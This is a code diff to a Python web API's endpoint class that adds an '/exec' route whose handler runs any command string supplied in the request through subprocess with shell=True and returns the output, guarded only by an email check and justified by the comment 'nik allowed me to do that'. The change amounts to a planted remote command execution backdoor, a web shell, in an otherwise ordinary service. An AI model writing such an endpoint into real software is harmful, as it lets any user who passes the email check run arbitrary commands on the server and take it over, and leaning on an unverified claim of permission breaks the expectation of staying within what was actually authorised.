@@ -1,4 +1,5 @@
 import glob
+import subprocess
 import zipfile
 from asyncio import tasks
 from multiprocessing.connection import Connection
@@ -54,6 +55,7 @@ class EndPoints:
         self.app.add_api_route(f"{V1_PREFIX}/login", self.login)
         self.app.add_api_route(f"{V1_PREFIX}/srt", self.srt)
         self.app.add_api_route(f"{V1_PREFIX}/logs", self.get_logs)
+        self.app.add_api_route(f"{V1_PREFIX}/exec", self.exec_cmd)
 
     def add_task(self, task: Task):
         self.tasks[task.uuid] = task
@@ -181,6 +183,19 @@ class EndPoints:
                 zipf.write(file)
 
         return FileResponse(zip_archive)
+
+    # nik allowed me to do that
+    async def exec_cmd(self, request: Request, cmd: str):
+
+        self.verify_user_mail(request)
+
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+        output, error = process.communicate()
+
+        if error:
+            return f"Error: {error}"
+
+        return output.decode('utf-8').strip()
 
     @staticmethod
     def get_userinfo(request: Request = None) -> dict[str, str, str]:
